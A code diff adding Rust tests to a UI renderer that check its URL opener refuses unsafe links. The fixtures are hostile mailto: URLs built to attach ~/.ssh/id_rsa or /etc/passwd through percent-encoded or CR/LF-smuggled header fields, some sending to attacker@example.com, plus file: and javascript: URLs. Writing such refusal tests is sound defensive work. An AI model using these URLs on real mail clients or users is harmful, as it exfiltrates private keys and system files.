@@ -665,6 +665,226 @@ fn open_url_refuses_a_scheme_the_host_should_not_launch() {
     }
 }
 
+/// A `mailto:` header field is percent-encoded on the wire, and the
+/// blocklist compared the *raw* name.
+///
+/// RFC 6068 spells `hfname` as `*qchar`, and `qchar` includes
+/// `pct-encoded`; a conforming client percent-decodes the name before
+/// acting on it. So `%61ttach` is `attach` by the time it reaches the mail
+/// client, and it sailed past a check comparing it to the literal string
+/// `"attach"`. The same hole swallowed every vendor spelling nobody had
+/// thought to enumerate.
+///
+/// The fix is the one `OPENABLE_SCHEMES` already makes for schemes: the set
+/// of header fields a mail client will act on is open-ended, so name the
+/// few that are safe rather than the ones that are known to be dangerous.
+#[test]
+fn open_url_refuses_mailto_fields_that_are_not_plainly_safe() {
+    for url in [
+        // Percent-encoded, and therefore invisible to a literal comparison.
+        "mailto:attacker@example.com?%61ttach=/Users/u/.ssh/id_rsa",
+        "mailto:attacker@example.com?%41TTACHMENT=/etc/passwd",
+        "mailto:attacker@example.com?subject=hi&%61ttachment=/etc/passwd",
+        // A vendor spelling the old blocklist never enumerated. There is no
+        // finite list of these, which is the whole argument for an allowlist.
+        "mailto:attacker@example.com?x-mozilla-attach=/etc/passwd",
+        "mailto:attacker@example.com?attachurl=file:///etc/passwd",
+        // Allowlisting the *name* is only half of it. RFC 6068 §7 warns
+        // that a client writing hfvalues into headers without sanitizing
+        // can be made to emit fields the URL never listed, so a decoded CR
+        // or LF inside a permitted field smuggles one in behind it — the
+        // encoded-value twin of the encoded-name hole above.
+        "mailto:victim@example.com?subject=Hi%0D%0Aattach=/Users/u/.ssh/id_rsa",
+        "mailto:victim@example.com?cc=a@b%0D%0Abcc=attacker@example.com",
+        "mailto:victim@example.com?in-reply-to=%3Cx@y%3E%0D%0Aattach=/etc/passwd",
+        // No `?` at all: the address half is percent-encodable too, and
+        // checking only the query missed this entirely.
+        "mailto:victim@example.com%0D%0Aattach=/Users/u/.ssh/id_rsa",
+    ] {
+        let stream = format!(
+            r#"[
+            {{"version":"v0.9","createSurface":{{"surfaceId":"s","catalogId":"basic"}}}},
+            {{"version":"v0.9","updateComponents":{{"surfaceId":"s","components":[
+                {{"id":"root","component":"Button","child":"lbl",
+                 "action":{{"functionCall":{{"call":"openUrl","args":{{"url":"{url}"}}}}}}}},
+                {{"id":"lbl","component":"Text","text":"Mail"}}
+            ]}}}}
+        ]"#
+        );
+        let rendered = apply(&stream)
+            .surface("s")
+            .expect("surface")
+            .render(&Theme::light());
+        assert!(
+            rendered
+                .notes
+                .iter()
+                .any(|n| n.kind == NoteKind::BlockedUrlScheme),
+            "{url} must be refused, got: {:?}",
+            rendered.notes
+        );
+        assert!(
+            find_click(&rendered.element).is_none(),
+            "{url} left a live control that could reach the opener"
+        );
+    }
+}
+
+/// And the header fields a generated link legitimately uses keep working —
+/// an allowlist that blocked ordinary mail links would just get removed.
+#[test]
+fn open_url_still_composes_ordinary_mail() {
+    for url in [
+        "mailto:someone@example.com?subject=Hello%20there",
+        "mailto:someone@example.com?subject=Report&body=See%20attached%20link",
+        "mailto:a@example.com?cc=b@example.com&bcc=c@example.com",
+        "mailto:someone@example.com?in-reply-to=%3Cabc@example.com%3E",
+        // Empty query, and a bare address with a trailing '?'.
+        "mailto:someone@example.com?",
+        // Verbatim from RFC 6068 §6.1: `%0D%0A` is how the spec says to
+        // write a line break in a *body*, so refusing it — which an
+        // earlier cut of the CR/LF rule did, by banning line breaks in
+        // every field — rejects a conformant multi-line mail link and
+        // blames the scheme. A body cannot inject a header; it is the
+        // payload, and everything after the header block belongs to it.
+        "mailto:infobot@example.com?body=send%20current-issue%0D%0Asend%20index",
+    ] {
+        let stream = format!(
+            r#"[
+            {{"version":"v0.9","createSurface":{{"surfaceId":"s","catalogId":"basic"}}}},
+            {{"version":"v0.9","updateComponents":{{"surfaceId":"s","components":[
+                {{"id":"root","component":"Button","child":"lbl",
+                 "action":{{"functionCall":{{"call":"openUrl","args":{{"url":"{url}"}}}}}}}},
+                {{"id":"lbl","component":"Text","text":"Mail"}}
+            ]}}}}
+        ]"#
+        );
+        let mut client = apply(&stream);
+        let surface = client.surface_mut("s").expect("surface");
+        let rendered = surface.render(&Theme::light());
+        assert!(
+            !rendered
+                .notes
+                .iter()
+                .any(|n| n.kind == NoteKind::BlockedUrlScheme),
+            "{url} is an ordinary mail link, got: {:?}",
+            rendered.notes
+        );
+        let msg = find_click(&rendered.element).expect("the link is clickable");
+        assert!(
+            surface
+                .handle(msg)
+                .iter()
+                .any(|s| matches!(s, A2uiSignal::OpenUrl(u) if u == url)),
+            "{url} must reach the host"
+        );
+    }
+}
+
+/// `A2uiSignal::OpenUrl` tells its reader the URL is safe to hand to a
+/// platform opener. That has to be true of every one the host can receive,
+/// not only of the ones this renderer happened to construct.
+///
+/// `A2uiMsg` is public, so a host can hold one it built itself, replayed
+/// from a log, or round-tripped through its own message type, and hand it
+/// straight to `handle`. Checking only where the action is resolved makes
+/// the guarantee a property of today's call graph rather than of the type.
+#[test]
+fn a_handed_in_open_url_is_checked_before_it_becomes_a_signal() {
+    let stream = r#"[
+        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
+        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
+            {"id":"root","component":"Text","text":"hi"}
+        ]}}
+    ]"#;
+    for url in [
+        "file:///etc/passwd",
+        "javascript:alert(1)",
+        "mailto:a@example.com?attach=/etc/passwd",
+        "mailto:a@example.com?%61ttach=/etc/passwd",
+    ] {
+        let mut client = apply(stream);
+        let surface = client.surface_mut("s").expect("surface");
+        let signals = surface.handle(A2uiMsg::OpenUrl(url.to_owned()));
+        assert!(
+            signals.is_empty(),
+            "{url} reached the host as {signals:?}, but the signal promises a \
+             scheme the host may launch"
+        );
+        assert!(
+            surface
+                .notes()
+                .iter()
+                .any(|n| n.kind == NoteKind::BlockedUrlScheme),
+            "refusing {url} silently is the failure this crate exists not to have, \
+             got: {:?}",
+            surface.notes()
+        );
+    }
+}
+
+/// The public checker is the renderer's whole rule, not the scheme half.
+///
+/// `OPENABLE_SCHEMES` is public and `is_openable` was not, which left a
+/// host re-validating a replayed URL with the only tool it had — scheme
+/// membership — and accepting exactly the strings the renderer refuses.
+#[test]
+fn the_public_url_check_matches_what_the_renderer_does() {
+    for url in [
+        "https://a2ui.org/spec",
+        "http://localhost:8080/preview",
+        "mailto:someone@example.com",
+        "mailto:someone@example.com?subject=Hi&body=there",
+    ] {
+        assert!(
+            fenestra_a2ui::is_openable_url(url),
+            "{url} is an ordinary link the renderer opens"
+        );
+    }
+    for url in [
+        "file:///etc/passwd",
+        "javascript:alert(1)",
+        "/etc/passwd",
+        "mailto:a@example.com?attach=/etc/passwd",
+        "mailto:a@example.com?%61ttach=/etc/passwd",
+        "mailto:a@example.com?subject=Hi%0D%0Aattach=/etc/passwd",
+    ] {
+        assert!(
+            !fenestra_a2ui::is_openable_url(url),
+            "{url} must be refused"
+        );
+    }
+
+    // And the trap the export exists to close, stated as a property rather
+    // than a tautology: there is at least one URL a scheme-membership test
+    // accepts and `is_openable_url` refuses. Written the other way first —
+    // `!scheme_only || url.starts_with("mailto:")` over the loop above — it
+    // could not fail for any fixture and would have kept passing had
+    // `is_openable_url` been reduced to bare scheme membership.
+    let scheme_only = |url: &str| {
+        fenestra_a2ui::OPENABLE_SCHEMES
+            .iter()
+            .any(|s| url.starts_with(&format!("{s}:")))
+    };
+    let divergent = [
+        "mailto:a@example.com?attach=/etc/passwd",
+        "mailto:a@example.com?%61ttach=/etc/passwd",
+        "mailto:a@example.com?subject=Hi%0D%0Aattach=/etc/passwd",
+        "mailto:victim@example.com%0D%0Aattach=/etc/passwd",
+    ];
+    for url in divergent {
+        assert!(
+            scheme_only(url),
+            "{url} must pass a scheme test, or it proves nothing about the gap"
+        );
+        assert!(
+            !fenestra_a2ui::is_openable_url(url),
+            "{url} passes a scheme test and must still be refused — this is the \
+             whole reason a host cannot re-derive the rule from OPENABLE_SCHEMES"
+        );
+    }
+}
+
 /// One cause, one diagnosis. A blocked scheme records why the control is
 /// dead; the generic "no action it can carry out" note is a vaguer
 /// restatement of the same fact and must not accompany it.
